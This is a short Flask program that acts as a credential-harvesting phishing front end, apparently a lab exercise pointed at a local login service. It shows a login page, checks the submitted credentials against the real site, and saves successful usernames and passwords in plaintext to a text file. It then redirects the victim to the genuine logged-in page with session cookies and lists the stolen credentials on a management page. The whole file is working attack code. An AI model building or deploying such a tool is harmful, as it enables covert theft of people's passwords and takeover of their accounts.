from flask import Flask, request, render_template, redirect
import requests
import hashlib
app = Flask(__name__)


def save_password(username, password):
    with open('Exposed Information.txt', 'a+') as f:
        f.write(f"username: {username}, password: {password}\n")


@app.route('/management_page')
def exposed_info():
    with open('Exposed Information.txt', 'r') as file:
        exposed_info = file.readlines()
    return render_template('management_page.html', exposed_info = exposed_info)


def authenticate_user(username, password):
    #define URL
    url = "http://127.0.0.1:8000"

    payload = {
        "username": username,
        "password": password,
        "submit": "submit"
    }

    response = requests.post(url, data=payload)

    if "Wrong" not in response.text:
        return True
    else:
        return False


def get_real_page(username, password):
    """Gets url of the real page"""
    r = requests.post('http://127.0.0.1:8000', {'username' : username, 'password': password, 'submit' : 'submit'})
    resp = redirect("http://localhost:8000/loggedIn", code=301)
    resp.set_cookie('USER', username)
    resp.set_cookie('LOGIN_INFO', hashlib.sha256(password.encode('UTF-8')).hexdigest())
    return resp


@app.route("/", methods=['POST', 'GET'])
def index():
    #when hitting the login button.
    if request.method == 'POST':
        #set username and password
        username = request.form['username']
        password = request.form['password']


        if authenticate_user(username, password):
            #save info if successful
            save_password(username, password)
            return get_real_page(username, password)
        else:
        #when login fails
            return "Login failed"

    else:
        return render_template('index.html')


if __name__ == "__main__":
    app.run(host="localhost", port=2223, debug=True)